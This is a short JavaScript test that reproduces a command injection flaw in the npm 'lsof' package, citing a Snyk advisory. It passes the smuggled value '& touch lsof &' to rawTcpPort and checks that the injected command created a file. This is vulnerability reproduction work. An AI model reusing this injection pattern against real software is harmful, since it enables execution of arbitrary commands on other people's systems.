//https://snyk.io/vuln/SNYK-JS-LSOF-543632
test("Command Injection in lsof", () => {
  const root = require("lsof");
  const fs = require("fs");
  const path = "./lsof";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let attack_code = "& touch lsof &";
  root.rawTcpPort(attack_code, function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
